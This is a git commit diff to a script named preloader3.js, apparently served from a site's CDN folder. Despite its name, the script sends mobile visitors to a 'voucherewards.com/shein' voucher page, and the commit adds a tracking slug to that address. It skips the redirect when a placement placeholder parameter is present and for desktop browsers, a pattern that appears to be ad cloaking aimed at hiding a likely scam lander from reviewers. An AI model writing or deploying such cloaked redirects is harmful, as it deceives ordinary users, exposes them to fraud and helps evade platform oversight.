514950338850a982e9d83dcb3cc8626c9ed886b9
carsoncraig1 <156372400+carsoncraig1@users.noreply.github.com>
2024-07-25 07:38:17 -0400

    Update preloader3.js

--- public/cdn/preloader3.js
+++ public/cdn/preloader3.js
@@ -2,7 +2,7 @@ const urlParams = new URLSearchParams(window.location.search);
 const utmXXX = urlParams.get("xxx");
 const s = urlParams.get("s");
 const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-const lander = `https://voucherewards.com/shein`;
+const lander = `https://voucherewards.com/shein?slug=${s}`;
 if (utmXXX === "__PLACEMENT__") { }
 else if (isMobileDevice) { window.location.href = lander; } 
 else { }
